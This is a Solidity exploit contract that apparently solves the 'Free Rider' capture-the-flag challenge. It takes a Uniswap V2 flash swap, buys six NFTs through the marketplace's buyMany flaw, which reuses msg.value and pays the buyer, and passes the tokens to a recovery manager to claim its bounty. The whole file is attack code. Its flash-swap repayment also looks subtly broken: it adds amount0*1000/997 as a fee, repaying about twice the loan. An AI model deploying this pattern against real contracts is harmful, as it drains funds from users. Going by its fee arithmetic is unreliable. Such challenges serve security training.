//SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../free-rider/FreeRiderNFTMarketplace.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {FreeRiderRecoveryManager} from "../free-rider/FreeRiderRecoveryManager.sol";

contract Solve is IERC721Receiver {
    FreeRiderNFTMarketplace public marketplace;
    IUniswapV2Pair public pair;
    WETH public weth;
    FreeRiderRecoveryManager public recoveryManager;

    constructor(
        FreeRiderRecoveryManager _recoveryManager,
        FreeRiderNFTMarketplace _marketplace,
        IUniswapV2Pair _pair,
        WETH _weth
    ) {
        recoveryManager = _recoveryManager;
        marketplace = _marketplace;
        pair = _pair;
        weth = _weth;
    }

    function borrow45ETH() external {
        pair.swap(45 ether, 0, address(this), "flashSwap");
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(pair), "Not UniswapV2Pair");

        weth.withdraw(amount0);
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: 45 ether}(tokenIds);
        for (uint256 i = 0; i < 6; i++) {
            marketplace.token().safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(tx.origin));
        }

        uint256 fee = amount0 * 1000 / 997;
        uint256 amountToRepay = amount0 + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
